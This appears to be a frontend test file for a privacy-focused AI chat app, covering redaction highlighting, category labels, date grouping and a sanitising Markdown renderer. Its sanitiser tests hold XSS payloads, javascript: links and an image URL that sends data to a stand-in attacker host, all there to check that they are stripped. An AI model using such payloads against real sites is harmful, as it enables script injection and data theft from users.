import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import type { Flag } from "@/api/types";
import { chatGroup, messageTime } from "@/lib/dates";

import { categoryLabel } from "./categories";
import { characterCount, highlightSegments } from "./highlight";
import { RedactedText } from "./RedactedText";
import { SafeMarkdown, safeUrl } from "./SafeMarkdown";

const flag = (startIndex: number, endIndex: number, category = "SA_ID"): Flag => ({
  category,
  startIndex,
  endIndex,
  detectorSource: "rule",
  explanation: "x",
});

describe("highlightSegments", () => {
  it("splits plain and flagged text", () => {
    expect(highlightSegments("My ID is 123 ok", [flag(9, 12)])).toEqual([
      { text: "My ID is ", flagged: false },
      { text: "123", flagged: true },
      { text: " ok", flagged: false },
    ]);
  });

  it("counts in characters like the backend, so emoji don't shift highlights", () => {
    // "😀" is one character for Python but two UTF-16 units in JavaScript.
    expect(highlightSegments("😀 ID 123", [flag(5, 8)]).filter((s) => s.flagged)).toEqual([
      { text: "123", flagged: true },
    ]);
  });

  it("merges overlaps and ignores out-of-range positions", () => {
    expect(highlightSegments("abcdef", [flag(1, 4), flag(3, 5), flag(10, 20), flag(4, 2)])).toEqual([
      { text: "a", flagged: false },
      { text: "bcde", flagged: true },
      { text: "f", flagged: false },
    ]);
  });

  it("counts characters", () => {
    expect(characterCount("😀ab")).toBe(3);
  });
});

describe("categoryLabel", () => {
  it.each([
    ["SA_ID", "ID number"],
    ["MEDICAL", "Health information"],
    ["NEW_THING", "New thing"],
    ["", "Sensitive information"],
  ])("%s -> %s", (category, label) => {
    expect(categoryLabel(category)).toBe(label);
  });
});

describe("RedactedText", () => {
  it("shows placeholders as 'hidden' badges and everything else as text", () => {
    render(<RedactedText text="ID [REDACTED_SA_ID] and <b>[note]</b>" />);
    expect(screen.getByTitle("ID number hidden from the AI")).toBeInTheDocument();
    expect(screen.getByText(/and <b>\[note\]<\/b>/)).toBeInTheDocument();
    expect(document.querySelector("b")).toBeNull();
  });
});

describe("SafeMarkdown", () => {
  it("renders Markdown formatting", () => {
    render(<SafeMarkdown text={"**Bold** and a list:\n\n- one\n- two"} />);
    expect(screen.getByText("Bold").tagName).toBe("STRONG");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
  });

  it("keeps single line breaks, so letters read as written", () => {
    const { container } = render(<SafeMarkdown text={"Kind regards,\nThabo"} />);
    expect(container.querySelector("br")).not.toBeNull();
  });

  it("never renders HTML from the reply", () => {
    const { container } = render(
      <SafeMarkdown text={'Hi <script>alert(1)</script><img src=x onerror="alert(1)"><iframe src="https://evil.example"></iframe>'} />,
    );
    expect(container.querySelector("script, img, iframe")).toBeNull();
  });

  it("does not load images (no tracking or data leaks through image URLs)", () => {
    const { container } = render(<SafeMarkdown text="![x](https://evil.example/pixel?data=secret)" />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("drops dangerous link targets", () => {
    render(<SafeMarkdown text="[click](javascript:alert(1)) [data](data:text/html,hi)" />);
    expect(screen.queryAllByRole("link")).toHaveLength(0);
    expect(safeUrl("javascript:alert(1)")).toBe("");
    expect(safeUrl("vbscript:x")).toBe("");
  });

  it("opens safe links in a new tab without a referrer", () => {
    render(<SafeMarkdown text="[docs](https://example.org/page)" />);
    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("href", "https://example.org/page");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")).toContain("noopener");
    expect(link.getAttribute("rel")).toContain("noreferrer");
  });
});

describe("dates", () => {
  const now = new Date("2026-11-04T15:00:00");

  it("shows message times briefly, with the day only when it isn't today", () => {
    expect(messageTime("2026-11-04T09:30:00", now)).toMatch(/^\d{2}:\d{2}/);
    expect(messageTime("2026-11-03T20:00:00", now)).toMatch(/^Yesterday /);
    expect(messageTime("2026-10-01T12:00:00", now)).toMatch(/1.*Oct|Oct.*1/);
    expect(messageTime("2025-10-01T12:00:00", now)).toMatch(/2025/);
    expect(messageTime("not a date", now)).toBe("");
  });

  it("groups chats like other chat apps", () => {
    expect(chatGroup("2026-11-04T01:00:00", now)).toBe("Today");
    expect(chatGroup("2026-11-03T23:00:00", now)).toBe("Yesterday");
    expect(chatGroup("2026-10-30T12:00:00", now)).toBe("Previous 7 days");
    expect(chatGroup("2026-10-15T12:00:00", now)).toBe("Previous 30 days");
    expect(chatGroup("2026-01-01T12:00:00", now)).toBe("Older");
    expect(chatGroup("garbage", now)).toBe("Older");
  });
});
